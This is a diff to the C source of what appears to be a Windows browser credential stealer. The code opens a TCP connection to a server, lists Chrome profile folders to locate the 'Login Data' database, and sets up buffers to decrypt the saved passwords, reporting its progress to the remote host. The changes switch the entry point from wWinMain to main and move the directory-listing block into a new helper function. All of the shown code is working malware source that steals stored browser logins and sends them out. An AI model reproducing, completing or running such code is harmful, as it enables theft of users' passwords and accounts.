@@ -49,8 +49,8 @@ BOOL connect_to_serv(SOCKET* ConnectSocket);
 void sendData(char* data);
 void closeConnection();
 
-int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
-//int main() {
+//int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
+int main() {
 	/* Connect to the server */
 	if (!connect(&ConnectSocket, SERVER_IP, DEFAULT_PORT)) {
 		return FALSE;
@@ -86,25 +86,6 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine
 	}
 
 
-
-	/* Converts the WCHAR chrome directory path to CHAR */
-	size_t size_returned_char_master_key;
-	errno_t err;
-	CHAR chrome_dir_char[MAX_PATH] = { '\0' };												// Chrome directory in CHAR, used to get profile paths to get Login Data db
-	if ((err = wcstombs_s(&size_returned_char_master_key, chrome_dir_char, MAX_PATH * sizeof(CHAR), chrome_dir, (MAX_PATH - 1) * sizeof(CHAR)))) {
-		sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "wcstombs_s: Error when converting wchar master key to char master key, error: %d\n", err);
-		sendData(tcp_send_buffer);
-		exit(1);
-	}
-	/* Gets a file handle for Chrome directory to list the files in that directory */
-	WIN32_FIND_DATAA dir_files;																// Handle to get file/folders on Chrome_dir
-	HANDLE dir_handle;																		// Handle to a directory/file
-	if (!get_file_handle(chrome_dir_char, &dir_files, &dir_handle)) {
-		sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "Getting Chrome Directory file handle failed\n");
-		sendData(tcp_send_buffer);
-		exit(1);
-	}
-
 	/* These are used to decrypt the passwords in database */
 	ULONG decrypted_credential_size = CIPHER_LEN, default_cipher_text_size = CIPHER_LEN;	// To hold the size of cipher text and the decrypted password size
 	BYTE* cipher_text_byte = (BYTE*)malloc(default_cipher_text_size);						// Allocate a buffer to hold the cipher text (actual encrypted password)
@@ -124,6 +105,23 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine
 	memset(decrypted_credential, 0, decrypted_credential_size);
 	
 
+	/* Converts the WCHAR chrome directory path to CHAR */
+	size_t size_returned_char_master_key;
+	errno_t err;
+	CHAR chrome_dir_char[MAX_PATH] = { '\0' };												// Chrome directory in CHAR, used to get profile paths to get Login Data db
+	if ((err = wcstombs_s(&size_returned_char_master_key, chrome_dir_char, MAX_PATH * sizeof(CHAR), chrome_dir, (MAX_PATH - 1) * sizeof(CHAR)))) {
+		sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "wcstombs_s: Error when converting wchar master key to char master key, error: %d\n", err);
+		sendData(tcp_send_buffer);
+		exit(1);
+	}
+	/* Gets a file handle for Chrome directory to list the files in that directory */
+	WIN32_FIND_DATAA dir_files;																// Handle to get file/folders on Chrome_dir
+	HANDLE dir_handle;																		// Handle to a directory/file
+	if (!get_file_explorer(chrome_dir_char, &dir_files, &dir_handle, tcp_send_buffer, DEFAULT_BUFLEN)) {
+		sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "Getting Chrome Directory file handle failed\n");
+		sendData(tcp_send_buffer);
+		exit(1);
+	}
 	/* Go through the files/folders in that directory */
 	do {
 		if (checkSubtring("Default", dir_files.cFileName) || checkSubtring("Profile", dir_files.cFileName)) {	// Check if a folder starts with "Deafult" or "Profile \d?" to identify profile directories
